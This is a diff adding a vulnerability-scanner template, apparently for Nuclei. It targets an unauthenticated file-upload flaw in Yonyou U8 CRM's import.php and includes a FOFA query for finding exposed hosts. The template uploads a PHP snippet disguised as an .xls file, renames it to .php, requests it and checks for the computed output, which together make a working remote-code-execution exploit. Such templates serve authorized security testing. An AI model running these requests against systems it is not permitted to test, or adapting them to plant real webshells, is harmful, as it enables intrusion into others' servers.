@@ -1,0 +1,50 @@
+id: yongyou-U8-CRM-import-files-upload
+
+info:
+  name: 用友U8 CRM import.php 文件上传致RCE漏洞
+  author: yongyou
+  severity: high
+  metadata: 
+    fofa-query: body="用友U8CRM"
+  tags: yongyon,u8,crm,upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+  
+http:
+  - raw:
+      - |
+        POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5
+        Content-Disposition: form-data; name="xfile"; filename="1.xls"
+        
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5
+        Content-Disposition: form-data; name="combo"
+
+        {{username}}.php
+        ------WebKitFormBoundarye0z8QbHs79gL8vW5--
+
+      
+      - |
+        GET /tmpfile/{{username}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
